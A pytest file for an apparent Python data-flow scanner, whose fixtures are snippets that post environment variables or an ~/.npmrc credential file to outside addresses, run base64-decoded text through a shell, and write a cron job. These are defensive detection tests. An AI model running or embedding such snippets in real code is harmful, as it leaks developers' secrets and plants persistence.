"""Where a Python file sends what it reads (`PythonFlowFacts`), in the JavaScript facts' words."""

from __future__ import annotations

import ast

from cordon_scanner.analysis.python.py_flow import IndexShape
from cordon_scanner.analysis.python.py_flow_facts import PythonFlowFacts


class TestSources:
    def test_the_environment_posted_to_an_address_built_at_run_time(self) -> None:
        source = (
            "import os, requests\ndef send(url):\n    requests."
            + "post(url, data=dict(os.env"
            + "iron))\n"
        )
        assert ("environment", "request", "unknown") in PythonFlowFacts.of(source)

    def test_the_machine_name_sent_to_a_named_host(self) -> None:
        source = (
            "import socket, urllib.request\n"
            "name = socket.gethostname()\n"
            "urllib.request.urlopen('https://telemetry.example.com/c?h=' + name)\n"
        )
        assert ("identity", "request", "fixed") in PythonFlowFacts.of(source)

    def test_a_credential_file_read_and_sent_to_an_address(self) -> None:
        # Joined at run time so this file's own source does not read as the flow it tests.
        source = (
            "import os, requests\n"
            "path = os.path.join(os.path.expanduser('~'), '.npm" + "rc')\n"
            "body = open(path).read()\n"
            "requests." + "post('http://203.0.113.5/x', data=body)\n"
        )
        facts = PythonFlowFacts.of(source)
        assert ("secret_file", "request", "ip") in facts
        assert ("home_file", "request", "ip") in facts

    def test_decoded_text_given_to_a_process(self) -> None:
        source = (
            "import base64, subprocess\nsubprocess."
            + "run(base64.b64"
            + "decode(blob), shell=True)\n"
        )
        assert ("decoded", "process", "unknown") in PythonFlowFacts.of(source)


class TestNoFlow:
    def test_a_request_that_carries_nothing_read_is_no_fact(self) -> None:
        source = "import requests\nrequests.get('https://pypi.org/simple/')\n"
        assert PythonFlowFacts.of(source) == set()

    def test_a_file_that_does_not_parse_gives_nothing(self) -> None:
        assert PythonFlowFacts.of("def (:\n") == set()


class TestTheIndexIsTheTreesOnce:
    """`PythonValueFlow.index` copies the tree's scopes, functions and calls from one walk per tree
    (`IndexShape`) and asks only its own seeds: every table equals the original walk's."""

    SOURCE = (
        "import os, socket\n"
        "counter = 0\n"
        "def outer(a, b=1):\n"
        "    global counter\n"
        "    counter += 1\n"
        "    name = socket.gethostname()\n"
        "    def inner(c):\n"
        "        nonlocal a\n"
        "        a = c\n"
        "        return [x for x in range(c)]\n"
        "    f = lambda y: y + a\n"
        "    return inner(name), f(2)\n"
        "class K:\n"
        "    def outer(self):\n"
        "        return dict(os.env" + "iron)\n"
        "outer(1)\n"
    )

    @staticmethod
    def tables(flow: PythonFlowFacts) -> tuple[object, ...]:
        return (
            dict(flow.scope_of),
            {scope: set(names) for scope, names in flow.local.items()},
            {name: [id(f) for f in fns] for name, fns in flow.functions.items()},
            [id(c) for c in flow.calls],
            list(flow.seeds.items()),
        )

    def test_the_shared_shape_gives_the_walk_s_tables(self) -> None:
        tree = ast.parse(self.SOURCE)
        shared, walked = PythonFlowFacts(tree), PythonFlowFacts(tree)
        assert shared.index() is True
        assert walked._index_walk() is True
        assert shared.seeds
        assert self.tables(shared) == self.tables(walked)

    def test_a_tree_is_walked_once_for_every_analyser(self, monkeypatch) -> None:
        built: list[int] = []
        real = IndexShape.of
        monkeypatch.setattr(IndexShape, "of", staticmethod(lambda t: built.append(1) or real(t)))
        tree = ast.parse(self.SOURCE)
        for _ in range(3):
            assert PythonFlowFacts(tree).index()
        assert built == [1]

    def test_past_the_seed_limit_the_partial_state_is_the_walk_s(self) -> None:
        class Few(PythonFlowFacts):
            MAX_SEEDS = 1

        tree = ast.parse(self.SOURCE)
        shared, walked = Few(tree), Few(tree)
        assert shared.index() is False
        assert walked._index_walk() is False
        assert self.tables(shared) == self.tables(walked)

    def test_the_shape_s_order_is_a_stack_walk_by_iter_child_nodes(self) -> None:
        """The walk reads each node's fields itself (`ctx` markers included): the order it records,
        which seeds are asked in, is the stack walk over `ast.iter_child_nodes` it replaced."""
        tree = ast.parse(self.SOURCE)
        want: list[int] = []
        stack: list[ast.AST] = [tree]
        while stack:
            node = stack.pop()
            want.append(id(node))
            stack.extend(ast.iter_child_nodes(node))
        assert [id(n) for n in IndexShape.of(tree).order] == want


class TestWrittenLinesOncePerTree:
    """`PythonPersistence.written_lines`: kept per tree for its three readers, and a file with no
    persistence literal answered without running the flow. Each is the full reading's answer."""

    SOURCES = (
        "import os\nx = os.getcwd()\nprint(x)\n",  # no persistence word: no seed
        "import subprocess\nsubprocess.run(['crontab', '-l'])\n",  # a listing only
        "def keep(text):\n    with open('/etc/cron.d/job', 'w') as fh:\n        fh.write(text)\n"
        "keep('* * * * * true')\n",  # a location written
        "P = '~/.bashrc'\nprint(P)\n",  # named, not written
    )

    @staticmethod
    def full(tree: ast.AST) -> frozenset[int] | None:
        """The reading before the change: the flow always run, nothing kept."""
        from cordon_scanner.analysis.python.py_persist import READ_ONLY_COMMAND, PythonPersistence

        analysis = PythonPersistence(tree)
        if not analysis.index():
            return None
        analysis.flow()
        listing = {
            label
            for label, texts in analysis.texts.items()
            if all(READ_ONLY_COMMAND.fullmatch(t) for t in texts)
        }
        out: set[int] = set()
        for node in analysis.calls:
            reached = analysis._written_by(node) - listing
            if reached:
                out |= reached
                out.update(range(node.lineno, (node.end_lineno or node.lineno) + 1))
        return frozenset(out)

    def test_each_file_s_lines_are_the_full_reading_s(self) -> None:
        from cordon_scanner.analysis.python.py_persist import PythonPersistence

        answers = []
        for source in self.SOURCES:
            want = self.full(ast.parse(source))
            assert PythonPersistence.written_lines(ast.parse(source)) == want, source
            answers.append(want)
        assert answers[0] == frozenset() and answers[2], "the cases cover none and a write"

    def test_a_tree_is_read_once_for_every_reader(self, monkeypatch) -> None:
        from cordon_scanner.analysis.python.py_persist import PythonPersistence

        tree = ast.parse(self.SOURCES[2])
        runs: list[int] = []
        real = PythonPersistence._written_lines.__func__
        monkeypatch.setattr(
            PythonPersistence,
            "_written_lines",
            classmethod(lambda cls, t: runs.append(1) or real(cls, t)),
        )
        first = PythonPersistence.written_lines(tree)
        assert PythonPersistence.written_lines(tree) == first
        assert runs == [1]
